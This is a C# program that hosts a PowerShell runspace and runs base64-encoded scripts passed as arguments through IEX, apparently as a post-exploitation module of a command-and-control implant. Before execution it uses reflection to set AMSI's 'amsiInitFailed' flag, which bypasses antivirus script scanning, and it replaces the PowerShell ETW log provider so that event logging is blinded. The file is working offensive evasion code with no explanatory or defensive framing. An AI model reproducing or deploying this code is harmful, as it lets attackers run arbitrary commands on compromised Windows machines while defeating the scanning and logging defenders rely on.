using System;
using System.Diagnostics.Eventing;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Reflection;
using System.Text;

public class Program
{
        public static string InvokeAutomation(string cmd)
    {
        try
        {
            runspace.ThreadOptions = PSThreadOptions.UseCurrentThread;
            Program.runspace.Open();
        }
        catch (InvalidRunspaceStateException)
        {
        }
        catch (Exception value)
        {
            Console.WriteLine(value);
        }
        RunspaceInvoke runspaceInvoke = new RunspaceInvoke(Program.runspace);
        PSVariable psvariable = new PSVariable("msp");
        Program.runspace.SessionStateProxy.PSVariable.Set(psvariable);
        PSVariable psvariable2 = new PSVariable("pwr");
        Program.runspace.SessionStateProxy.PSVariable.Set(psvariable2);
        try
        {
            runspaceInvoke.GetType().Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed", BindingFlags.Static | BindingFlags.NonPublic).SetValue(null, true);
        }
        catch
        {
        }
        try
        {
            Type type = Program.runspace.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
            if (type != null)
            {
                FieldInfo field = type.GetField("etwProvider", BindingFlags.Static | BindingFlags.NonPublic);
                EventProvider value2 = new EventProvider(Guid.NewGuid());
                field.SetValue(null, value2);
            }
        }
        catch
        {
        }
        Pipeline pipeline = Program.runspace.CreatePipeline();
        Program.runspace.SessionStateProxy.SetVariable("msp", cmd);
        pipeline.Commands.AddScript("IEX \"`$Error.Clear()\"");
        pipeline.Commands.AddScript("$pwr = IEX $msp | Out-String");
        pipeline.Commands.AddScript("$pwr = $pwr + $Error[0] | Out-String");
        pipeline.Invoke();
        return Program.runspace.SessionStateProxy.GetVariable("pwr").ToString();
    }

        public static void Main(string[] args)
    {
        try
        {
            if (args[0].StartsWith("loadmodule"))
            {
                byte[] bytes = Convert.FromBase64String(args[0].Replace("loadmodule", ""));
                string value = Program.InvokeAutomation(Encoding.UTF8.GetString(bytes));
                Console.WriteLine("Module loaded successfully");
                Console.WriteLine(value);
            }
            else
            {
                byte[] bytes2 = Convert.FromBase64String(args[0]);
                Console.WriteLine(Program.InvokeAutomation(Encoding.UTF8.GetString(bytes2)));
            }
        }
        catch (Exception arg)
        {
            Console.WriteLine(string.Format("Error in PS Module: {0}", arg));
        }
    }

        private static Runspace runspace = RunspaceFactory.CreateRunspace();
}
